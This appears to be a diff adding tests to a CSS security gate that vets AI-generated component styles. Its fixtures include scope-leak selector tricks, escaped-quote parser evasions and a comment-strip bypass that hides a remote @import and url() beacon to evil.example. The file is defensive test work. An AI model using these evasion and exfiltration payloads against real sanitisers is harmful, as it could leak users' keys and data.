@@ -12,7 +12,7 @@ const { test, describe } = require('node:test');
 const assert = require('node:assert/strict');
 
 const { ASK_SYSTEM, askComponentMessages, askRepairMessages, askDesignRefineMessages, askComponentRefineMessages, coerceRefinement, coerceComponent, rankSimilar, auditComponentDesign, addScopePrefix, MAX_CSS_BYTES } = require('../../../lib/layout/ai.js');
-const { gateComponent, findUnscopedSelectors } = require('../../../lib/layout/gate.js');
+const { gateComponent, gateCss, findUnscopedSelectors } = require('../../../lib/layout/gate.js');
 const { JSDOM } = require('jsdom');
 const { FAMILY_NAMES } = require('../../../lib/adaptive/families.js');
 
@@ -519,12 +519,71 @@ describe('component-ai — scope-prefix safe fix (§6, self-verifying)', () => {
     assert.match(r.css, /content:"\}"/, 'the content string is preserved verbatim');
     assert.equal(findUnscopedSelectors(r.css, 'x').length, 0);
   });
-  test('a quoted attribute selector makes it BAIL (never corrupt) — gate still flags the leak', () => {
+  test('a brace inside an attribute VALUE no longer defeats the fix — it scopes cleanly', () => {
+    // This used to BAIL. The bail was never about this selector being unsafe to
+    // rewrite — the rewriter has been string-aware all along — it was that the GATE
+    // walker was not, so it read the `{` inside the attribute value as a rule opener,
+    // still saw a leak in the rewritten sheet, and `addScopePrefix` rejected its own
+    // correct output. `eachRule` is string-aware now, the two agree, and the fix lands.
     const css = 'ul[data-state="{}"] { color:var(--text-body) }';
     const r = addScopePrefix(css, 'x');
-    assert.equal(r.fixed, false, 'declines to auto-fix a quoted selector');
+    assert.equal(r.fixed, true);
+    assert.equal(r.css, 'section.x ul[data-state="{}"] { color:var(--text-body) }');
+    assert.equal(findUnscopedSelectors(r.css, 'x').length, 0);
+  });
+  test('a `.name` spelled inside an attribute value does NOT count as scoping', () => {
+    // The hostile twin of the case above, and the one that must never be certified:
+    // the selector scopes nothing, and the only `.x` in it is TEXT inside a quoted
+    // value. The gate flags it, and `addScopePrefix` declines rather than corrupt.
+    const css = 'ul[data-state="} section.x "] { color:red }';
+    assert.equal(findUnscopedSelectors(css, 'x').length, 1, 'the leak is reported');
+    const r = addScopePrefix(css, 'x');
+    assert.equal(r.fixed, false, 'declines — the gate keeps flagging it');
     assert.equal(r.css, css, 'returns the original untouched — no corruption');
   });
+  /**
+   * THE FAIL-OPEN THE STRING TRACKING ABOVE INTRODUCED, and the reason it belongs
+   * right here: teaching `eachRule` about quotes without teaching it about ESCAPES
+   * turned a false-positive into a blind spot. `\'` is a legal escaped character in a
+   * class name — `.a\'b` selects the class `a'b` — so reading it as a string opener
+   * starts a string that never closes, the walk runs to end of input, and every rule
+   * after it is invisible. Driven through real Chromium: the browser applied `.leaky`
+   * to the page while the gate reported nothing at all.
+   */
+  test('BITES: an escaped quote in a class name does NOT blind the walker', () => {
+    const css = ".a\\'b { color: var(--text-body) }\n.leaky { color: var(--text-body) }";
+    assert.deepEqual(findUnscopedSelectors(css, 'x').map((s) => s.selector), [".a\\'b", '.leaky']);
+    assert.equal(gateCss(css, 'x').findings.filter((f) => f.rule === 'scope').length, 2);
+  });
+
+  test('…and the same for an escaped double quote, brace, and backslash', () => {
+    for (const esc of ['\\"', '\\}', '\\{', '\\\\']) {
+      const css = `.a${esc}b {}\n.leaky {}`;
+      assert.deepEqual(findUnscopedSelectors(css, 'x').map((s) => s.selector), [`.a${esc}b`, '.leaky'], esc);
+    }
+  });
+
+  /**
+   * THE COMMENT-STRIP BYPASS, which was live in `gateCss` and is what moved the
+   * scanners onto `lib/core/css-comments.mjs`'s walk. Comments and strings are not
+   * independent layers: a naive `/\/\*[\s\S]*?\*\//` pairs the `/*` INSIDE a string
+   * with the next real closer and blanks everything between — here, a remote
+   * `@import` and a remote `url()` beacon, out of the gate that decides whether CSS
+   * reaches a same-origin preview frame holding the user's BYOK key.
+   */
+  test('BITES: a `content: "/*"` string cannot blank an exfil payload out of the gate', () => {
+    const css = [
+      'section.x::after { content: "/*" }',
+      '@import url(https://evil.example/beacon.css);',
+      'section.x { background: url(https://evil.example/leak) }',
+      '/* harmless note */',
+    ].join('\n');
+    const rules = gateCss(css, 'x').findings.map((f) => f.rule);
+    assert.ok(rules.includes('css-import'), 'the remote @import must be found');
+    assert.ok(rules.includes('css-url-remote'), 'the remote url() beacon must be found');
+    assert.equal(gateCss(css, 'x').ok, false);
+  });
+
   test('pathologically deep at-rule nesting can NOT blow the stack — it bails safely', () => {
     // Untrusted, AI-generated CSS could nest @media absurdly deep; the rewriter (and the
     // gate walker it verifies against) must cap the recursion, not overflow the JS stack.
